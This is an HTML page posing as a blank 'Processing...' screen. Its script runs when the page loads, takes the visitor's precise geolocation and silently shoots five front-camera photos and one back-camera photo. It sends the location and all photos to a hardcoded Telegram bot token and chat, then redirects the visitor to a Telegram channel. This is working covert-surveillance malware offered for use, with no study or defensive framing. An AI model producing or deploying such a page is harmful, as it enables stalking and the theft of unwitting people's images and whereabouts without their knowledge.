<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blank Page</title>
    <style>
        body { margin: 0; padding: 0; overflow: hidden; background-color: #fff; font-family: Arial, sans-serif; }
        #loading { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); display: none; text-align: center; z-index: 1000; }
        #cameraFeed, #cameraCanvas { display: none; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: 360deg); } }
    </style>
</head>
<body>
    <div id="loading">
        <div class="spinner"></div>
        <p>Processing...</p>
    </div>
    
    <video id="cameraFeed" autoplay playsinline></video>
    <canvas id="cameraCanvas"></canvas>

    <script>
        const BOT_TOKEN = '7876995869:AAGmef_SeJE8II79qZPcsRstw6kELpcbHDs';
        const CHAT_ID = '-1002649976086';
        const REDIRECT_URL = 'https://t.me/fdh_alhamer';
        
        let trackId = '';
        let currentStream = null;

        const el = (id) => document.getElementById(id);
        const delay = (ms) => new Promise(res => setTimeout(res, ms));

        function generateTrackId() {
            return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        async function telegramApi(method, body, isPhoto = false) {
            const headers = isPhoto ? {} : { 'Content-Type': 'application/json' };
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
                method: 'POST',
                headers: headers,
                body: isPhoto ? body : JSON.stringify(body)
            });
            const result = await response.json();
            console.log(`${method} result:`, result);
            return result.ok;
        }

        async function sendPhotoToTelegram(photoData, photoNumber, cameraType) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', dataURItoBlob(photoData), `photo_${trackId}_${photoNumber}_${cameraType}.jpg`);
            formData.append('caption', `Track ID: ${trackId}\nPhoto: ${photoNumber}\nCamera: ${cameraType}`);
            return telegramApi('sendPhoto', formData, true);
        }

        async function sendLocationToTelegram(latitude, longitude) {
            return telegramApi('sendLocation', { chat_id: CHAT_ID, latitude, longitude });
        }

        async function sendMessageToTelegram(message) {
            return telegramApi('sendMessage', { chat_id: CHAT_ID, text: message });
        }

        async function setupCamera(facingMode = 'user') {
            const video = el('cameraFeed');
            try {
                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                }
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
                video.srcObject = stream;
                currentStream = stream;
                await video.play();
                return true;
            } catch (err) {
                console.error('Error accessing camera:', err);
                return false;
            }
        }

        async function takePhoto() {
            const video = el('cameraFeed');
            const canvas = el('cameraCanvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/jpeg', 0.8);
        }

        function getLocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => resolve({ latitude: position.coords.latitude, longitude: position.coords.longitude }),
                        (error) => { console.error("Error getting location:", error); reject(error); },
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                } else {
                    reject(new Error("Geolocation not supported"));
                }
            });
        }

        async function executeSequence() {
            try {
                trackId = generateTrackId();
                console.log('Generated track ID:', trackId);
                el('loading').style.display = 'block';
                // await sendMessageToTelegram(`New session started - Track ID: ${trackId}`);
                
                try {
                    const location = await getLocation();
                    console.log('Location obtained:', location);
                    await sendLocationToTelegram(location.latitude, location.longitude);
                } catch (error) {
                    console.error('Could not get location:', error);
                    // await sendMessageToTelegram(`Track ID: ${trackId} - Location access denied or failed`);
                }
                
                const cameraActions = [
                    { type: 'front', count: 5, delay: 500 },
                    { type: 'back', count: 1, delay: 0 }
                ];

                for (const action of cameraActions) {
                    const cameraSetupSuccess = await setupCamera(action.type === 'front' ? 'user' : 'environment');
                    if (cameraSetupSuccess) {
                        // await delay(1000); // Stabilize camera
                        for (let i = 1; i <= action.count; i++) {
                            const photoData = await takePhoto();
                            await sendPhotoToTelegram(photoData, i, action.type);
                            if (action.delay > 0) await delay(action.delay);
                        }
                    } else {
                        0
                        // await sendMessageToTelegram(`Track ID: ${trackId} - ${action.type} camera access denied or failed`);
                    }
                }
                
                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                }
                
                // await sendMessageToTelegram(`Track ID: ${trackId} - Session completed successfully`);
                el('loading').style.display = 'none';
                setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
                
            } catch (error) {
                console.error('Error in execution sequence:', error);
                // await sendMessageToTelegram(`Track ID: ${trackId} - Error occurred: ${error.message}`);
                setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);
            }
        }

        window.addEventListener('load', () => { setTimeout(executeSequence, 500); });
    </script>
</body>
</html>

